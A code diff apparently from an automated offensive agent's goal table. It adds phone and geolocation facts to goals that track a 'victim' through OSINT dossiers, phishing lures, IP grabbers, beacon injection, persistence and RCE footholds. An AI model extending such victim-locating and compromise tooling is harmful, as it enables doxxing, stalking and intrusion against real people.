@@ -29,7 +29,11 @@ GOAL_FACTS = {
     # listing it here pulled cover-building ahead of OSINT, breaking
     # the identity doctrine (dossier before cover). Terminal identity =
     # know who they are + where they are.
-    "identity": ["identity", "victim_ip"],
+    # `geolocation` is the coarse where-they-are fact: passive phone
+    # metadata (phone_osint) pins a region long before a lure ever leaks a
+    # victim IP, and a report reader wants both bands. It is additive — the
+    # `identity` finding from OSINT still satisfies the goal on its own.
+    "identity": ["identity", "victim_ip", "geolocation"],
     # enrich: the DEEPEN sub-agent's goal — passive OSINT/breach/profile
     # deepening + grabber polling. Deliberately excludes the phish/dm_sent
     # facts so this worker NEVER launches new lures while the lead waits.
@@ -43,7 +47,8 @@ GOAL_FACTS = {
     "enrich": ["identity", "persona_profile", "dossier", "profile",
                "account_link", "breach_exposure", "victim_ip",
                "email_candidate", "domain_candidate", "email_verified",
-               "service_account", "identity_widened"],
+               "service_account", "identity_widened",
+               "phone", "geolocation"],
     "complete_kill_chain": ["beacon"],  # beacon injection is the terminal goal
     "deliver": ["beacon", "persistence"],  # deliver mode: beacon + persistence,
     # web: the URL/app chain terminal is the RCE foothold, not a beacon —
